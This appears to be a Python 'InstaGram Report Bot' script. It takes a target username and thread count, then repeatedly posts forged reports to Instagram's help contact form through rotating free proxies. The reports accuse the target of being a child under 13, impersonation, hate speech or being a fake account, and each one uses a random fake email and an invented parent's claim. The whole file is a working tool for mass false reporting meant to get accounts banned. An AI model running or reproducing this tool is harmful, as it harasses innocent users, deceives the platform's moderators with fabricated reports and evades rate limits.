import requests
import random
import threading
import time
import sys
import os
import re
from datetime import datetime
G = '\033[1;32m'
R = '\033[1;31m'
W = '\033[1;37m'
Y = '\033[1;33m'
B = '\033[1;34m'
C = '\033[1;36m'
RESET = '\033[0m'
LOGO = f"""
{B}         >> InstaGram Report Bot <<
{W}      User: {G}@WHI3PER {W}| Version: {Y}2.0 PREMIUM{RESET}
"""
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
def fetch_free_proxies():
    print(f"{Y} [!] Fetching fresh proxies...{RESET}")
    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    try:
        res = requests.get(url, timeout=10)
        return res.text.strip().split('\n')
    except:
        return []
FORMS = {
    "1": {"id": "723586364339719", "tag": "UNDERAGE", "name": "Child Under 13"},
    "2": {"id": "445835985441327", "tag": "IMPERSONATION", "name": "Identity Theft"},
    "3": {"id": "122114784511514", "tag": "HATE-SPEECH", "name": "Violence & Hate"},
    "4": {"id": "149405991809051", "tag": "FAKE-ACC", "name": "Scam/Fake Account"}
}
clear()
print(LOGO)
target_user = input(f' {B}[{W}+{B}] {W}Target Username : {G}')
target_name = input(f' {B}[{W}+{B}] {W}Target Name     : {G}')
threads_limit = int(input(f' {B}[{W}+{B}] {W}Threads         : {G}'))
print(f"\n{C} [ PROXY OPTIONS ]")
print(f"{W} [1] Use proxies.txt")
print(f"{W} [2] Use Free Proxies (Auto)")
print(f"{W} [3] Direct (No Proxy)")
proxy_choice = input(f" {B}[{W}?{B}] {W}Choice: {G}")
PROXIES = []
if proxy_choice == "1":
    if os.path.exists('proxies.txt'):
        with open('proxies.txt', 'r') as f:
            PROXIES = [l.strip() for l in f if l.strip()]
elif proxy_choice == "2":
    PROXIES = fetch_free_proxies()
print(f"\n{C} [ REPORT TYPES ]")
for k, v in FORMS.items():
    print(f"{W} [{k}] {v['name']}")
print(f"{W} [5] Random Mix (All types)")
report_choice = input(f" {B}[{W}?{B}] {W}Choice: {G}")
def attack(tid):
    sent = 0
    sess = requests.Session()
    while True:
        try:
            px_map = None
            if PROXIES:
                proxy = random.choice(PROXIES)
                px_map = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            if report_choice == "5":
                form = random.choice(list(FORMS.values()))
            else:
                form = FORMS.get(report_choice, FORMS["1"])
            ts = str(datetime.timestamp(datetime.now())).split('.')[0]
            email = f"report.{random.randint(111,999)}@gmail.com"
            head = {
                "Host": "help.instagram.com",
                "x-fb-lsd": "AVq5uabXj48",
                "x-asbd-id": "129477",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://help.instagram.com",
                "referer": f"https://help.instagram.com/contact/{form['id']}"
            }
            data = {
                'jazoest': '2931',
                'lsd': 'AVq5uabXj48',
                'Field258021274378282': target_user,
                'Field735407019826414': target_name,
                'Field506888789421014[year]': '2014',
                'Field506888789421014[month]': '11',
                'Field506888789421014[day]': '11',
                'Field294540267362199': 'Parent',
                'inputEmail': email,
                'support_form_id': form['id'],
                'support_form_locale_id': 'en_US',
                '__user': '0',
                '__a': '1',
                '__spin_t': ts
            }
            res = sess.post('https://help.instagram.com/ajax/help/contact/submit/page', 
                            data=data, headers=head, proxies=px_map, timeout=10) 
            if res.status_code == 200:
                sent += 1
                p_info = proxy[:10] if PROXIES else "Direct"
                print(f" {W}[{R}T-{tid}{W}] {G}Sent: {sent} {W}| {Y}{form['tag']} {W}| {B}{p_info}{RESET}", flush=True)   
        except:
            pass
        time.sleep(0.1)
clear()
print(LOGO)
print(f" {R}[!] Targeting : {target_user}")
print(f" {R}[!] Method    : {'Mixed Modes' if report_choice == '5' else FORMS[report_choice]['name']}")
print(f" {R}[!] Status    : Running {threads_limit} threads...\n {W}{'-'*60}")
for i in range(1, threads_limit + 1):
    threading.Thread(target=attack, args=(i,), daemon=True).start()
try:
    while True: time.sleep(0.1)
except KeyboardInterrupt:
    print(f"\n{R} [!] Session Terminated. {RESET}")
